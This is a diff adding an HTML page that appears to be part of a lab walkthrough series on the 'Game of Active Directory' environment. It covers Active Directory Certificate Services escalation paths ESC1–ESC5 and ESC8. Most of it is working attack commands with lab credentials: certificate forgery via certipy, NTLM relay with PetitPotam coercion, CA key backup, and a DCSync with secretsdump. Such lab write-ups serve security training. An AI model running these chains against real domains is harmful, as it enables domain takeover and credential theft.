@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GOAD Part 5 - ADCS ESC1-ESC16 | Mr Stark</title>
+    <meta name="description" content="Game of Active Directory - Part 5: ADCS ESC1-ESC16">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <style>
+        :root {
+            --bg-primary: #0a0a0f;
+            --bg-secondary: #12121a;
+            --bg-tertiary: #1a1a24;
+            --bg-code: #1e1e2e;
+            --accent: #ff6b35;
+            --accent-hover: #ff8555;
+            --text-primary: #e0e0e0;
+            --text-secondary: #a0a0a0;
+            --text-muted: #707070;
+            --border: #2a2a3a;
+            --success: #4caf50;
+            --warning: #ff9800;
+            --error: #f44336;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.7;
+        }
+        .container {
+            display: flex;
+            min-height: 100vh;
+        }
+        .sidebar {
+            width: 300px;
+            background-color: var(--bg-secondary);
+            border-right: 1px solid var(--border);
+            padding: 2rem 1.5rem;
+            position: fixed;
+            height: 100vh;
+            overflow-y: auto;
+            z-index: 100;
+        }
+        .profile {
+            text-align: center;
+            margin-bottom: 2rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+        }
+        .avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent), #ff8c5a);
+            margin: 0 auto 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: white;
+        }
+        .profile h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+        .profile p {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+        .nav-section {
+            margin-bottom: 2rem;
+        }
+        .nav-section h3 {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-muted);
+            margin-bottom: 1rem;
+        }
+        .nav-list {
+            list-style: none;
+        }
+        .nav-list li {
+            margin-bottom: 0.5rem;
+        }
+        .nav-list a {
+            display: block;
+            padding: 0.75rem 1rem;
+            color: var(--text-secondary);
+            text-decoration: none;
+            border-radius: 8px;
+            transition: all 0.2s;
+            font-size: 0.9rem;
+        }
+        .nav-list a:hover {
+            background-color: var(--bg-tertiary);
+            color: var(--text-primary);
+        }
+        .nav-list a.active {
+            background-color: var(--accent);
+            color: white;
+            font-weight: 600;
+        }
+        .main-content {
+            flex: 1;
+            margin-left: 300px;
+            padding: 3rem 4rem;
+            max-width: 1000px;
+        }
+        .content-header {
+            margin-bottom: 3rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+        }
+        .content-header h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: var(--accent);
+        }
+        .content-header p {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+        }
+        .content-body h2 {
+            font-size: 1.75rem;
+            font-weight: 700;
+            margin: 2.5rem 0 1rem;
+            color: var(--accent);
+        }
+        .content-body h3 {
+            font-size: 1.4rem;
+            font-weight: 600;
+            margin: 2rem 0 1rem;
+            color: var(--text-primary);
+        }
+        .content-body h4 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin: 1.5rem 0 0.75rem;
+            color: var(--text-secondary);
+        }
+        .content-body p {
+            margin-bottom: 1.25rem;
+            color: var(--text-primary);
+        }
+        .content-body code {
+            font-family: 'JetBrains Mono', monospace;
+            background-color: var(--bg-code);
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.9em;
+            color: var(--accent);
+        }
+        .content-body pre {
+            background-color: var(--bg-code);
+            padding: 1.5rem;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            border: 1px solid var(--border);
+        }
+        .content-body pre code {
+            background: none;
+            padding: 0;
+            color: var(--text-primary);
+            font-size: 0.85rem;
+            line-height: 1.6;
+        }
+        .content-body ul, .content-body ol {
+            margin: 1rem 0 1.5rem 2rem;
+        }
+        .content-body li {
+            margin-bottom: 0.5rem;
+        }
+        .content-body strong {
+            color: var(--accent);
+            font-weight: 600;
+        }
+        .content-body img {
+            max-width: 100%;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            border: 1px solid var(--border);
+        }
+        .content-body blockquote {
+            border-left: 4px solid var(--accent);
+            padding-left: 1.5rem;
+            margin: 1.5rem 0;
+            color: var(--text-secondary);
+            font-style: italic;
+        }
+        .content-body a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+        .content-body a:hover {
+            text-decoration: underline;
+        }
+        .content-body table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+        }
+        .content-body th, .content-body td {
+            padding: 0.75rem 1rem;
+            border: 1px solid var(--border);
+            text-align: left;
+        }
+        .content-body th {
+            background-color: var(--bg-tertiary);
+            font-weight: 600;
+        }
+        .content-body tr:nth-child(even) {
+            background-color: var(--bg-secondary);
+        }
+        .nav-footer {
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .nav-footer a {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.75rem 1.5rem;
+            background-color: var(--bg-tertiary);
+            color: var(--text-primary);
+            text-decoration: none;
+            border-radius: 8px;
+            transition: all 0.2s;
+            border: 1px solid var(--border);
+        }
+        .nav-footer a:hover {
+            background-color: var(--accent);
+            color: white;
+            border-color: var(--accent);
+        }
+        .nav-footer .next {
+            margin-left: auto;
+        }
+        @media (max-width: 1024px) {
+            .sidebar {
+                width: 260px;
+            }
+            .main-content {
+                margin-left: 260px;
+                padding: 2rem;
+            }
+        }
+        @media (max-width: 768px) {
+            .sidebar {
+                display: none;
+            }
+            .main-content {
+                margin-left: 0;
+                padding: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <aside class="sidebar">
+            <div class="profile">
+                <div class="avatar">S</div>
+                <h1>Mr Stark</h1>
+                <p>GOAD Series</p>
+            </div>
+            <nav class="nav-section">
+                <h3>Navigation</h3>
+                <ul class="nav-list">
+                    <li><a href="index.html">Overview</a></li>
+                    <li><a href="part-1-lab-setup.html">Part 1: Lab Setup</a></li>
+                    <li><a href="part-2-finding-users.html">Part 2: Finding Users</a></li>
+                    <li><a href="part-3-authenticated-enumeration.html">Part 3: Authenticated Enum</a></li>
+                    <li><a href="part-4-ntlm-relaying.html">Part 4: NTLM Relaying</a></li>
+                    <li><a href="part-5-adcs.html" class="active">Part 5: ADCS</a></li>
+                    <li><a href="part-6-mssql.html">Part 6: MSSQL</a></li>
+                </ul>
+            </nav>
+        </aside>
+        <main class="main-content">
+            <div class="content-header">
+                <h1>GOAD Part 5 - ADCS ESC1-ESC16</h1>
+                <p>We have reached a massive pivot point in our operation. By entering the realm of Active Directory Certificate Services (ADCS), we are essentially moving from fighting the guards at the front gate to bribing the person who prints the security badges.</p>
+            </div>
+            <div class="content-body">
+                <p>We have reached a massive pivot point in our operation. By entering the realm of <strong>Active Directory Certificate Services (ADCS)</strong>, we are essentially moving from fighting the guards at the front gate to bribing the person who prints the security badges. In modern Red Team engagements, ADCS exploitation has arguably surpassed traditional methods like Kerberoasting in terms of both stealth and impact.</p>
+
+                <h2>How Does ADCS Work?</h2>
+                <p>When a user or device requests a certificate, the request is sent to the CA, which validates the request based on the configured certificate template. If the request is approved, the CA issues the certificate, which can then be used for authentication, encryption, or other purposes.</p>
+
+                <h2>The Exploitation Logic of PKINIT and The Chain of Trust</h2>
+                <p>To master these attacks, we must grasp exactly how obtaining a simple file, a certificate, allows us to compromise the entire domain. Active Directory leverages a Kerberos extension known as <strong>PKINIT</strong> (Public Key Cryptography for Initial Authentication). This mechanism allows a security principal to request a <strong>Kerberos Ticket Granting Ticket (TGT)</strong> by presenting a valid X.509 certificate instead of encrypting a timestamp with a password hash.</p>
+
+                <h2>The ESC Families</h2>
+                <p>We can categorize the Escalation (ESC) vectors into four primary logical families:</p>
+
+                <ul>
+                    <li><strong>Template Misconfigurations:</strong> Attacks that exploit the blueprints (templates) used to issue certificates.</li>
+                    <li><strong>Access Control Abuses:</strong> Attacks that target weak permissions on the PKI infrastructure objects.</li>
+                    <li><strong>Relay Vectors:</strong> Attacks that weaponize network traffic (NTLM) against the ADCS web or RPC interfaces.</li>
+                    <li><strong>Mapping and Logic Flaws:</strong> The newest generation of attacks that exploit how the Domain Controller maps a certificate back to a specific user account.</li>
+                </ul>
+
+                <h2>I. The Template Injection Family (ESC1, ESC2, ESC3)</h2>
+                <p>The most direct path to compromise involves manipulating the blueprints for certificates, known as <strong>Certificate Templates</strong>.</p>
+
+                <h3>ESC1: Subject Alternative Name Spoofing</h3>
+                <p><strong>ESC1</strong> is the "King" of ADCS exploits. It relies on a specific flag in the template configuration called <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code>. When this is enabled on a template that allows client authentication, the CA essentially allows the requestor to write their own ID card.</p>
+
+                <h4>Discovery</h4>
+                <p><code>certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -stdout</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_1.png" alt="screenshot_1">
+
+                <h4>Fabrication</h4>
+                <p><code>certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -target 'braavos.essos.local' -template 'ESC1' -ca 'ESSOS-CA' -upn 'administrator@essos.local'</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_3.png" alt="screenshot_3">
+
+                <h4>Authentication</h4>
+                <p><code>certipy-ad auth -pfx administrator.pfx -dc-ip '10.4.10.12'</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_4.png" alt="screenshot_4">
+
+                <p><code>export KRB5CCNAME=administrator.ccache
+poetry run netexec smb meereen.essos.local -k --use-kcache</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_5.png" alt="screenshot_5">
+
+                <h3>ESC2: The Universal Key (Any Purpose)</h3>
+                <p>The ESC2 vulnerability manifests when a certificate template is configured with an <strong>"Any Purpose" EKU</strong> (OID 2.5.29.37.0) or, surprisingly, when it has absolutely <strong>no EKUs defined</strong> at all.</p>
+
+                <p><code>certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -stdout</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_6.png" alt="screenshot_6">
+
+                <h4>Request ESC2 Certificate</h4>
+                <p><code>certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'ESC2' -ca 'ESSOS-CA'</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_8.png" alt="screenshot_8">
+
+                <h4>Request On-Behalf-Of</h4>
+                <p><code>certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'User' -ca 'ESSOS-CA' -on-behalf-of 'essos\\administrator' -pfx khal.drogo.pfx</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_9.png" alt="screenshot_9">
+
+                <h4>Authenticate</h4>
+                <p><code>certipy-ad auth -pfx administrator.pfx -dc-ip '10.4.10.12'</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_10.png" alt="screenshot_10">
+
+                <h3>ESC3: The Enrollment Agent</h3>
+                <p><strong>ESC3</strong> is an architectural abuse of the "<strong>Enrollment Agent</strong>" role. In a secure PKI hierarchy, the Certificate Authority designates specific high-trust administrators as Enrollment Agents.</p>
+
+                <p><code>certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -stdout</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_12.png" alt="screenshot_12">
+
+                <h4>Request Agent Certificate</h4>
+                <p><code>certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'ESC3-CRA' -ca 'ESSOS-CA'</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_14.png" alt="screenshot_14">
+
+                <h4>Request Certificate On-Behalf-Of</h4>
+                <p><code>certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'User' -ca 'ESSOS-CA' -on-behalf-of 'essos\\administrator' -pfx khal.drogo.pfx</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_15.png" alt="screenshot_15">
+
+                <h2>II. Access Control and Object Takeover (ESC4, ESC5, ESC7)</h2>
+                <p>Sometimes the template itself is secure, but the permission controls protecting the PKI infrastructure are weak.</p>
+
+                <h3>ESC4: Template Hijacking</h3>
+                <p><strong>ESC4</strong> represents a vulnerability class rooted in weak object permissions rather than insecure template configurations. If our user has <code>GenericWrite</code> or <code>WriteDACL</code> permissions on a specific Template Object, we can maliciously reconfigure it.</p>
+
+                <p><code>certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -stdout</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_18.png" alt="screenshot_18">
+
+                <h4>Modify Template</h4>
+                <p><code>certipy-ad template -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -template 'ESC4' -debug -write-default-configuration</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_20.png" alt="screenshot_20">
+
+                <h4>Exploit and Cleanup</h4>
+                <p><code>certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'ESC4' -ca 'ESSOS-CA' -upn 'administrator@essos.local'
+certipy-ad template -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -template 'ESC4' -write-configuration 'ESC4.json' -no-save</code></p>
+
+                <h3>ESC5: Vulnerable PKI Object Access Control - Golden Certificate</h3>
+                <p><strong>ESC5</strong> identifies critical weaknesses in the Access Control Lists (ACLs) that govern the PKI architecture itself. If we control the computer account of the CA server, we possess total control.</p>
+
+                <p><code>poetry run netexec ldap meereen.essos.local -u 'khal.drogo' -p 'horse' -M adcs</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_25.png" alt="screenshot_25">
+
+                <h4>Backup CA Private Key</h4>
+                <p><code>certipy-ad ca -backup -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'braavos.essos.local' -ca 'ESSOS-CA' -target 'braavos.essos.local' -debug</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_27.png" alt="screenshot_27">
+
+                <h4>Forge Golden Certificate</h4>
+                <p><code>certipy-ad forge -ca-pfx 'ESSOS-CA.pfx' -upn 'administrator@essos.local'</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_28.png" alt="screenshot_28">
+
+                <p><code>certipy-ad auth -pfx administrator.pfx -dc-ip '10.4.10.12'</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_29.png" alt="screenshot_29">
+
+                <h2>III. The Network Relay Vectors (ESC6, ESC8, ESC11)</h2>
+                <p>These vulnerabilities move the attack from the database to the wire, exploiting how the Certificate Authority authenticates incoming enrollment requests.</p>
+
+                <h3>ESC8: NTLM Relay to ADCS HTTP Endpoints</h3>
+                <p><strong>ESC8</strong> is arguably the most pervasive flaw in modern networks. The web interface often accepts <strong>NTLM authentication</strong> but does not enforce Extended Protection for Authentication (EPA) or SSL usage by default.</p>
+
+                <h4>Setup Listener</h4>
+                <p><code>ntlmrelayx.py -t http://10.4.10.23/certsrv/certnsh.asp -smb2support --adcs --template DomainController</code></p>
+
+                <h4>Trigger Coerce</h4>
+                <p><code>petitpotam.py 10.4.10.1 meereen.essos.local</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_33.png" alt="screenshot_33">
+
+                <h4>Get TGT</h4>
+                <p><code>gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_35.png" alt="screenshot_35">
+
+                <h4>DCSync</h4>
+                <p><code>secretsdump.py -k -no-pass 'ESSOS.LOCAL'/'meereen$'@'meereen.essos.local'</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_36.png" alt="screenshot_36">
+
+                <h3>ESC8 with Certipy</h3>
+                <p><code>sudo certipy relay -target 10.4.10.23 -template DomainController</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_37.png" alt="screenshot_37">
+
+                <p><code>python3 PetitPotam.py 10.4.10.1 meereen.essos.local</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_38.png" alt="screenshot_38">
+
+                <p><code>sudo certipy auth -pfx meereen.pfx -dc-ip 10.4.10.12</code></p>
+
+                <img src="./game-of-active-directory/part-5-adcs/images/screenshot_39.png" alt="screenshot_39">
+
+                <h2>IV. Logic and Mapping Flaws (ESC9, ESC10, ESC13, ESC14, ESC15)</h2>
+                <p>The final frontier of ADCS exploitation involves complex abuses of how the Domain Controller maps a certificate back to a user account.</p>
+
+                <ul>
+                    <li><strong>ESC9 and ESC10:</strong> Exploit the nuances of the <code>msDS-StrongCertificateBindingInformation</code> attribute</li>
+                    <li><strong>ESC13:</strong> Focuses on hidden links through Issuance Policies</li>
+                    <li><strong>ESC14:</strong> Targets weak explicit mappings in <code>altSecurityIdentities</code></li>
+                    <li><strong>ESC15:</strong> V1/V0 Schema Abuse</li>
+                </ul>
+            </div>
+            <div class="nav-footer">
+                <a href="part-4-ntlm-relaying.html">← Previous: Part 4</a>
+                <a href="part-6-mssql.html" class="next">Next: Part 6 →</a>
+            </div>
+        </main>
+    </div>
+    <script>hljs.highlightAll();</script>
+</body>
+</html>
